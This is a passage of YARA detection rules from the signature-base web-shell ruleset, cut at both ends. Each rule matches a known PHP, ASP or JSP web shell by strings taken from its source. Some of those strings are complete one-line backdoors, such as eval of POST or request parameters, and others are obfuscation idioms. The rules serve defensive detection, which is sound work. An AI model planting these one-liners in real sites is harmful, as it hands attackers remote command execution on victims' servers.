		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L321-L335"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "e63f5a96570e1faf4c7b8ca6df750237"
		logic_hash = "5cc698e4ff23ca296b339589d12c24e67c99272e73445604a4552d3023e19636"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<input type=\"submit\" name=\"Send\" value=\"GO!\">" fullword
		$s8 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Private_I3Lue
{
	meta:
		description = "Web Shell - file Private-i3lue.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L336-L349"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "13f5c7a035ecce5f9f380967cf9d4e92"
		logic_hash = "274586f2c451eda45c3a52b615961dbba806f8d25e34cc358e661fcfd1143d08"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "case 15: $image .= \"\\21\\0\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Mysql_Interface_V1_0
{
	meta:
		description = "Web Shell - file Mysql interface v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L366-L379"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a12fc0a3d31e2f89727b9678148cd487"
		logic_hash = "baa938c4cfd2c46b1752d866e186d76a04c353617d8ec3e0d78a3c546b120d13"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "echo \"<td><a href='$PHP_SELF?action=dropDB&dbname=$dbname' onClick=\\\"return"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_S_U
{
	meta:
		description = "Web Shell - file s-u.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L380-L393"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "efc7ba1a4023bcf40f5e912f1dd85b5a"
		logic_hash = "3c6904fa475784e737275fd47eabea077bed57e920071c68fa09f7defecbdb72"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<a href=\"?act=do\"><font color=\"red\">Go Execute</font></a></b><br /><textarea"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpshell_2_1_Config
{
	meta:
		description = "Web Shell - file config.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L394-L407"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bd83144a649c5cc21ac41b505a36a8f3"
		logic_hash = "51d16bcaef5f6795ebcd1154dca79d5cf5a389948b0e59f4939c30fef877e816"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "; (choose good passwords!).  Add uses as simple 'username = \"password\"' lines." fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_EFSO_2
{
	meta:
		description = "Web Shell - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L408-L421"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "19bd00fabe0b4695129c180dd145e757e0b2c2a6dad751e8c889222c191e03ce"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "%8@#@&P~,P,PP,MV~4BP^~,NS~m~PXc3,_PWbSPU W~~[u3Fffs~/%@#@&~~,PP~~,M!PmS,4S,mBPNB"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Up
{
	meta:
		description = "Web Shell - file up.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L422-L435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "515a5dd86fe48f673b72422cccf5a585"
		logic_hash = "77c8121d000c45e44717689dec535fde7c9722005d1e4ff40d0b84abcf289f47"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "// BUG: Corta el fichero si es mayor de 640Ks" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Networkfilemanagerphp
{
	meta:
		description = "Web Shell - file NetworkFileManagerPHP.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L436-L449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "acdbba993a5a4186fd864c5e4ea0ba4f"
		logic_hash = "235e4062a9b9ebdf7dd0b8a2cb3b16ba7688a75b90d8c527344cf9605304838d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "  echo \"<br><center>All the data in these tables:<br> \".$tblsv.\" were putted "

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Server_Variables
{
	meta:
		description = "Web Shell - file Server Variables.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L450-L464"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "47fb8a647e441488b30f92b4d39003d7"
		logic_hash = "2a85301f1d6e4c457ff0a1b2a08eb6f054905993a0667087f37b9a7352e38911"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "<% For Each Vars In Request.ServerVariables %>" fullword
		$s9 = "Variable Name</B></font></p>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Caidao_Shell_Ice_2
{
	meta:
		description = "Web Shell - file ice.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L465-L478"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1d6335247f58e0a5b03e17977888f5f2"
		logic_hash = "57c3c369abd826d676290300d8df2d890b777fa1f0e1156654062159a4228db7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php ${${eval($_POST[ice])}};?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Caidao_Shell_Mdb
{
	meta:
		description = "Web Shell - file mdb.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L479-L492"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fbf3847acef4844f3a0d04230f6b9ff9"
		logic_hash = "89f7692acd754992f9379b9b4661a01d6ab95cb85a3c2699928aa5ed3a3ac8c5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<% execute request(\"ice\")%>a " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Guige
{
	meta:
		description = "Web Shell - file guige.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L493-L506"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2c9f2dafa06332957127e2c713aacdd2"
		logic_hash = "9d71095b5c709dfdd8b5fcebcaa4493d9c93e841e85cda2e2255e0c15ea83659"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(damapath!=null &&!damapath.equals(\"\")&&content!=null"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpspy2010
{
	meta:
		description = "Web Shell - file phpspy2010.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L507-L522"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "14ae0e4f5349924a5047fed9f3b105c5"
		logic_hash = "b3acef196b30cf9afe24c81860bedff69fc5652c514aa36aba85d16b12bcc432"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "eval(gzinflate(base64_decode("
		$s5 = "//angel" fullword
		$s8 = "$admin['cookiedomain'] = '';" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_Ice
{
	meta:
		description = "Web Shell - file ice.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L523-L536"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d141e011a92f48da72728c35f1934a2b"
		logic_hash = "524419e802d3cb6ac310565af22ec28044984aa4b1b2ee1cfbd292afd071709c"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "D,'PrjknD,J~[,EdnMP[,-4;DS6@#@&VKobx2ldd,'~JhC"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Drag_System
{
	meta:
		description = "Web Shell - file system.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L537-L550"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "15ae237cf395fb24cf12bff141fb3f7c"
		logic_hash = "8ea8d9d64521f47f1396e4f4d6c8f4a71fa1a643799ec408e1d2e0f255dc4996"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "String sql = \"SELECT * FROM DBA_TABLES WHERE TABLE_NAME not like '%$%' and num_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Darkblade1_3_Asp_Indexx
{
	meta:
		description = "Web Shell - file indexx.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L551-L564"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b7f46693648f534c2ca78e3f21685707"
		logic_hash = "57cfe09d53d42ee9d909a3894b8a3362209c1972c7d96ae5fdc61681c2998a89"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCou"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Phpshell3
{
	meta:
		description = "Web Shell - file phpshell3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L565-L580"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "76117b2ee4a7ac06832d50b2d04070b8"
		logic_hash = "868b1b69fab3ec6fcfa15557075f313f4af0ec9cd15f41bb9dcc9bc26fc17f93"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
		$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
		$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Hsxa
{
	meta:
		description = "Web Shell - file hsxa.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L581-L594"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d0e05f9c9b8e0b3fa11f57d9ab800380"
		logic_hash = "7f79b66d87f638bc09ee576de4dc4a8c5b1da7c406d318eeff7a4221c35d2313"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Jsp_Utils
{
	meta:
		description = "Web Shell - file utils.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L595-L609"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "9827ba2e8329075358b8e8a53e20d545"
		logic_hash = "90a5b64e59306bdffc5a89f5d86a2dc7a17669021d863e2a5ecea13d65c19053"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "ResultSet r = c.getMetaData().getTables(null, null, \"%\", t);" fullword
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_01
{
	meta:
		description = "Web Shell - file 01.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L610-L623"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "61a687b0bea0ef97224c7bd2df118b87"
		logic_hash = "e057800013a9a8f4c3ecbe4e27c14e904700548e6ad9dc1f00313c7a3de7fd2d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%eval request(\"pass\")%>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Asp_404
{
	meta:
		description = "Web Shell - file 404.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L624-L637"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "d9fa1e8513dbf59fa5d130f389032a2d"
		logic_hash = "3db951af36ed3d08bc10b4c3fc2e67481f005580fb76f66b6ec5789ed6e2efdb"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "lFyw6pd^DKV^4CDRWmmnO1GVKDl:y& f+2"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshell_Cnseay02_1
{
	meta:
		description = "Web Shell - file webshell-cnseay02-1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L638-L651"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "95fc76081a42c4f26912826cb1bd24b1"
		logic_hash = "9950fb7c26dfb25665093dbcf5c4a9dcf65466783509a3caa11c2c96d177d855"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Fbi
{
	meta:
		description = "Web Shell - file fbi.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L652-L665"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "1fb32f8e58c8deb168c06297a04a21f1"
		logic_hash = "de8584ae83ee3e23f4ce00ccd73f75b4568d6a4544af45b83784a9a0c34d42e3"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "erde types','Getallen','Datum en tijd','Tekst','Binaire gegevens','Netwerk','Geo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_B374Kphp_B374K
{
	meta:
		description = "Web Shell - file B374k.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L666-L682"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bed7388976f8f1d90422e8795dff1ea6"
		logic_hash = "1f0fc5e309dd67a11d6ba9b698fd9ca3c7e6616545c220de79aaa3b63f0ad931"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Http://code.google.com/p/b374k-shell" fullword
		$s1 = "$_=str_rot13('tm'.'vas'.'yngr');$_=str_rot13(strrev('rqb'.'prq'.'_'.'46r'.'fno'"
		$s3 = "Jayalah Indonesiaku & Lyke @ 2013" fullword
		$s4 = "B374k Vip In Beautify Just For Self" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Cmd_Asp_5_1
{
	meta:
		description = "Web Shell - file cmd-asp-5.1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L683-L696"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8baa99666bf3734cbdfdd10088e0cd9f"
		logic_hash = "1ff4ae8c08cec4605594e97d6c077d4808d3a73c04ddf6a51952252dd2d01cf4"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s9 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_Dodo_Zip
{
	meta:
		description = "Web Shell - file zip.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L697-L711"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b7800364374077ce8864796240162ad5"
		logic_hash = "bdeffafdedeadaba36c5c67f981c42d6111b954622780b930e9eeb9956c638b5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x"
		$s3 = "$datastr = \"\\x50\\x4b\\x03\\x04\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Azrailphp_V1_0
{
	meta:
		description = "Web Shell - file aZRaiLPhp v1.0.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L712-L726"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "d0ccf9e37e378db4523d7918b30cff358115e7a4c36fad55a75f3aff218563c6"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo \" <font color='#0000FF'>CHMODU \".substr(base_convert(@fileperms($"
		$s7 = "echo \"<a href='./$this_file?op=efp&fname=$path/$file&dismi=$file&yol=$path'><fo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Php_List
{
	meta:
		description = "Web Shell - file list.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L727-L742"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "922b128ddd90e1dc2f73088956c548ed"
		logic_hash = "007f9307493bca71dcbdcf6ba6c45bf36899e8f636ccbd09c26453cb0aea0847"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "// list.php = Directory & File Listing" fullword
		$s2 = "    echo \"( ) <a href=?file=\" . $fichero . \"/\" . $filename . \">\" . $filena"
		$s9 = "// by: The Dark Raver" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Ironshell
{
	meta:
		description = "Web Shell - file ironshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-01-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L743-L757"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		logic_hash = "7e4916010a33383cfc3cbbcd5d575ac2f3a579220b66bd07e3121f3db30da66d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
